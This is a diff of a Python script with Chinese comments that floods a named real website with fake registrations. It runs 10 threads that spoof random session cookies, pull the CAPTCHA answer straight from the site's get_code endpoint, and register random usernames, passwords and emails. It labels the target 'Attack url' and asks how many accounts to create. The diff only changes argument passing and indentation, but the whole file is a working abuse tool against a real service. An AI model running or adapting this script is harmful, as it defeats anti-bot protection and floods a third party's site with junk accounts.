@@ -5,7 +5,7 @@ import re
 import threading
 from datetime import datetime
 
-def register():
+def register(num):
     i = int(0)
     #创建写入注册用户信息的文件
     #f = open("",'a+')
@@ -20,7 +20,7 @@ def register():
             'cookie':'PHPSESSID='+''.join(random.sample(chars,random.randint(26,26)))
         }
 
-    #获取验证码
+        #获取验证码
         url_Getcode='https://www.dzzyisp.com/index.php?m=member&c=checklogin&a=get_code&k=Wed%20Oct%2006%202021%2011%3A36%3A01%20GMT%2B0800%20(%E4%B8%AD%E5%9B%BD%E6%A0%87%E5%87%86%E6%97%B6%E9%97%B4)40000'   
         resp=requests.get(url=url_Getcode,headers=headers)
         text=resp.text
@@ -29,7 +29,7 @@ def register():
         jsonObj=json.loads(text)
         code = jsonObj['MSG']['code']
         
-    #注册用户信息
+        #注册用户信息
         user=''.join(random.sample(chars,random.randint(3,30)))+str(random.randint(10,100000)) # ''.join()将列表中的内容转换成字符串
         passwd=str(random.randint(1000000,1000000000))
         email=str(random.randint(100,2000000))+'@'+str(random.randint(10,10000))+'.com'
@@ -60,12 +60,13 @@ def register():
             #记录
             #f.write("username:%s password:%s\n" %(user,passwd))
             i += 1
+            
             global sub
             sub += 1
         else:
             pass
     print('[pass]成功注册%d名用户' %(sub))
-    #f.close()
+    # f.close()
 
 def thread():
     start = datetime.now()
@@ -73,7 +74,7 @@ def thread():
     
     #创建10个线程
     for _ in range(10):
-        t = threading.Thread(target=register)
+        t = threading.Thread(target=register,args=(num,))
         threads.append(t)
     
     #启动10个线程
@@ -84,7 +85,7 @@ def thread():
 
 if __name__ == '__main__':
     print('[warning]Attack url:https://www.dzzyisp.com\n[notice]The threads is 10')
-    global number,sub
+    global sub
     sub = int(0)
     num = int(input('You want to create users amount(if you put 10,it will create 100 users.):'))
     thread()
